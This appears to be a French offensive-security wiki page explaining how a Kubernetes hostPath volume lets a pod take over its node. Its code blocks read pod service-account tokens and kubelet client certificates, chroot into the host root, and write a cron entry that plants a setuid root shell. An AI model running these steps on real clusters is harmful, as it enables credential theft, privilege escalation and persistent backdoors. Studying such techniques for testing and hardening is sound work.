---
order: 2
title: "Montage hostPath : accès au nœud via un répertoire du nœud monté"
description: "Un pod avec un volume hostPath monte un répertoire du nœud worker dans le conteneur. Selon le chemin, cela expose le système de fichiers racine du nœud, les identifiants du kubelet et les répertoires de tokens des pods, le socket du container runtime, ou le /etc de l'hôte, chacun donnant la compromission du nœud sans aucune capability ni exploit."
keywords:
  - hostpath
  - volume kubernetes
  - système de fichiers du nœud
  - kubelet
  - prise de contrôle du nœud
---

# Montage hostPath

Un volume `hostPath` mappe un répertoire du nœud dans le pod, et les fichiers qui se trouvent derrière sont les vrais fichiers du nœud. C'est l'une des évasions de pod vers nœud les plus courantes, car de nombreuses charges de travail légitimes demandent un hostPath pour les logs, les sockets ou l'accès aux périphériques, et un chemin trop large livre le nœud au pod. La gravité est déterminée par le chemin monté et par le fait qu'il soit accessible en écriture ou non.

Trouvez le montage hostPath :

```bash
findmnt -o TARGET,SOURCE,OPTIONS | grep -vE 'overlay|tmpfs|proc|sysfs|cgroup'
# a SOURCE that is a node subtree (e.g. /var/lib/kubelet[...] or /) is a hostPath
cat /proc/self/mountinfo | grep -v overlay | head
```

## Voies selon le chemin monté

```bash
# whole node root mounted: chroot straight in
chroot /host-root sh      # (mount target varies; use the one findmnt showed)

# /var/lib/kubelet: pod tokens and kubelet client certs
cat /host/var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token 2>/dev/null
cat /host/var/lib/kubelet/pki/kubelet-client-current.pem 2>/dev/null

# the runtime socket mounted in: launch a privileged container (node root)
ls -l /host/run/containerd/containerd.sock /host/var/run/docker.sock 2>/dev/null

# host /etc writable: cron or SSH key for node persistence
echo '* * * * * root cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > /host-etc/cron.d/x
```

Un montage de `/var/lib/kubelet` est particulièrement puissant : il contient le token de service account projeté de chaque pod planifié, si bien que les lire fournit de nombreuses identités du cluster d'un coup.

## Notes d'exploitation

- Énumérez le montage exact avec `findmnt` ; le sous-arbre source indique quelle voie s'applique avant de tenter quoi que ce soit.
- Un hostPath du socket du container runtime est une prise de contrôle du nœud via le socket, pas une voie par fichier ; voir [Montage du socket du runtime](../../../container-escape/sensitive-mounts/runtime-socket-mount.md).
- Un hostPath en lecture seule expose tout de même les secrets du nœud et les tokens des pods ; priorisez les tokens de `/var/lib/kubelet` et les certificats client du kubelet pour le pivot vers le cluster.
- Les mécanismes généraux de montage de fichiers correspondent au [Montage hostPath](../../../container-escape/sensitive-mounts/host-path-mount.md) indépendant du runtime.

## Références

- [Kubernetes: hostPath volumes](https://kubernetes.io/docs/concepts/storage/volumes/#hostpath)
- [BishopFox: bad pods (hostPath)](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation)
